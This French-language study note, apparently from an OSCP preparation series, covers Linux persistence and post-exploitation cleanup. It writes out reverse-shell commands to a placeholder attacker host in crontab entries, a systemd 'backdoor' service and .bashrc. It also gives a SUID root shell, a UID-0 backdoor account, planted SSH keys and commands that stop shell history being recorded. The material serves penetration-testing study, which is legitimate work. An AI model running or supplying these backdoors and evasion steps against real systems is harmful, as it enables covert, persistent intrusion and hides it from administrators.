# 06-Persistance et Nettoyage

Après avoir réussi à élever les privilèges, il est souvent nécessaire de maintenir l'accès au système et de nettoyer les traces de l'intrusion, en particulier dans un contexte d'examen comme l'OSCP ou lors d'engagements réels.

## Maintien de l'Accès (Persistance)

L'objectif de la persistance est de s'assurer que l'accès au système compromis peut être rétabli même après un redémarrage ou si la vulnérabilité initiale est corrigée.

**Techniques Courantes de Persistance Linux :**

1.  **Clés SSH Autorisées :**
    *   Ajouter votre clé publique SSH au fichier `~/.ssh/authorized_keys` de l'utilisateur root (ou d'un autre utilisateur privilégié).
    ```bash
    # Sur la machine attaquante
    # cat ~/.ssh/id_rsa.pub

    # Sur la machine cible (en tant que root)
    mkdir -p /root/.ssh
    echo "ssh-rsa AAAAB3NzaC1yc2EAAA..." >> /root/.ssh/authorized_keys # Remplacez par votre clé publique
    chmod 700 /root/.ssh
    chmod 600 /root/.ssh/authorized_keys
    ```

2.  **Tâches Cron :**
    *   Créer une tâche cron qui exécute un reverse shell ou un autre payload à intervalles réguliers.
    ```bash
    # En tant que root
    (crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/IP_ATTAQUANT/PORT 0>&1'") | crontab -
    # Ou créer un fichier dans /etc/cron.d/
    echo "* * * * * root /usr/bin/nc -e /bin/bash IP_ATTAQUANT PORT" > /etc/cron.d/backdoor_cron
    chmod 644 /etc/cron.d/backdoor_cron
    ```

3.  **Binaires SUID :**
    *   Copier un shell et lui donner les permissions SUID root.
    ```bash
    # En tant que root
    cp /bin/bash /usr/local/bin/rootshell
    chmod u+s /usr/local/bin/rootshell
    # Utilisation : /usr/local/bin/rootshell -p
    ```
    *   **Attention :** C'est très bruyant et facile à détecter. À utiliser avec précaution.

4.  **Services Systemd/SysVinit :**
    *   Créer un service malveillant qui démarre automatiquement.
    *   Exemple Systemd (`/etc/systemd/system/backdoor.service`):
    ```ini
    [Unit]
    Description=My Backdoor Service
    After=network.target

    [Service]
    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/IP_ATTAQUANT/PORT 0>&1'
    Restart=always
    User=root

    [Install]
    WantedBy=multi-user.target
    ```
    ```bash
    # En tant que root
    systemctl daemon-reload
    systemctl enable backdoor.service
    systemctl start backdoor.service
    ```

5.  **Modification de `.bashrc` / `.profile` :**
    *   Ajouter des commandes au fichier `.bashrc` ou `.profile` d'un utilisateur (y compris root) pour qu'elles s'exécutent à la connexion.
    ```bash
    # En tant que root, pour l'utilisateur root
    echo "bash -i >& /dev/tcp/IP_ATTAQUANT/PORT 0>&1 &" >> /root/.bashrc
    ```
    *   **Note :** L'esperluette `&` en fin de commande permet de l'exécuter en arrière-plan pour ne pas bloquer la connexion.

6.  **Comptes Utilisateur :**
    *   Créer un nouvel utilisateur avec des privilèges élevés ou modifier le mot de passe d'un utilisateur existant.
    ```bash
    # En tant que root
    # Créer un utilisateur avec UID 0 (équivalent à root)
    useradd -o -u 0 -g 0 -M -s /bin/bash backdoor_user
    echo "backdoor_user:VotreMotDePasseSecurise" | chpasswd

    # Ou ajouter un utilisateur existant au groupe sudo/wheel
    # usermod -aG sudo nom_utilisateur_existant
    ```

7.  **Web Shells (si applicable) :**
    *   Si un serveur web est présent et que vous avez les droits d'écriture dans le répertoire racine web, déposer un web shell.

**Considérations pour l'OSCP :**
*   La persistance est souvent une bonne pratique et peut être requise.
*   Choisissez des méthodes qui correspondent au contexte de la machine et qui sont relativement discrètes.
*   Documentez toujours les mécanismes de persistance que vous mettez en place.

## Nettoyage Post-Exploitation (OSCP Mindset)

Le nettoyage est crucial pour éviter de laisser des traces évidentes de votre passage et pour maintenir une approche professionnelle.

1.  **Suppression des Outils et Payloads :**
    *   Supprimez tous les scripts, exploits, binaires compilés, et autres fichiers que vous avez transférés ou créés sur la machine cible.
    ```bash
    rm /tmp/exploit.c /tmp/exploit /tmp/linpeas.sh /tmp/payload.sh /tmp/evil_lib.so /tmp/evil_lib.c
    # Adaptez la liste à vos fichiers
    ```

2.  **Nettoyage de l'Historique des Commandes :**
    *   Soyez prudent avec cela. Supprimer tout l'historique est suspect.
    *   Techniques pour éviter l'enregistrement (à utiliser *avant* les commandes sensibles) :
    ```bash
    export HISTFILESIZE=0
    export HISTSIZE=0
    unset HISTFILE
    # Ou pour Bash :
    # set +o history
    # Ou préfixer les commandes d'un espace (si HISTCONTROL contient ignorespace ou ignoreboth)
    #  echo $HISTCONTROL
    #  ma_commande_sensible
    ```
    *   Supprimer le fichier d'historique est une option, mais très visible :
    ```bash
    # rm ~/.bash_history
    # ln -s /dev/null ~/.bash_history # Empêche l'écriture future (peut être détecté)
    ```

3.  **Restauration des Configurations :**
    *   Si vous avez modifié des fichiers de configuration (ex: `/etc/passwd`, `/etc/sudoers`, fichiers de service), essayez de les restaurer à leur état d'origine si possible et si cela ne compromet pas votre accès (si la persistance est ailleurs et que vous quittez la machine).

4.  **Suppression des Mécanismes de Persistance :**
    *   Si la persistance n'est plus nécessaire ou si vous devez être particulièrement furtif à la fin de votre intervention, supprimez les mécanismes que vous avez mis en place.
    ```bash
    # Exemple suppression cron
    # (crontab -l | grep -v 'IP_ATTAQUANT' ) | crontab -
    # rm /etc/cron.d/backdoor_cron

    # Exemple suppression service systemd
    # systemctl stop backdoor.service
    # systemctl disable backdoor.service
    # rm /etc/systemd/system/backdoor.service
    # systemctl daemon-reload
    # systemctl reset-failed
    ```

5.  **Vérification des Logs (Lecture, pas suppression agressive) :**
    *   Examinez les logs (`/var/log/auth.log`, `/var/log/syslog`, logs applicatifs) pour comprendre quelles traces votre activité a pu laisser. La suppression agressive des logs est généralement une mauvaise idée, très détectable et peut détruire des preuves importantes pour les administrateurs système. Comprendre ce qui est logué est plus important pour adapter vos techniques futures.

**Principes Clés du Nettoyage :**
*   **Furtivité :** Agissez de manière à minimiser les artefacts.
*   **Réversibilité :** Si vous modifiez quelque chose, sachez comment le défaire.
*   **Contexte :** Adaptez vos actions de nettoyage à l'environnement et aux objectifs (examen vs. engagement réel).
*   **Documentation :** Notez les modifications que vous effectuez pour pouvoir les annuler proprement. 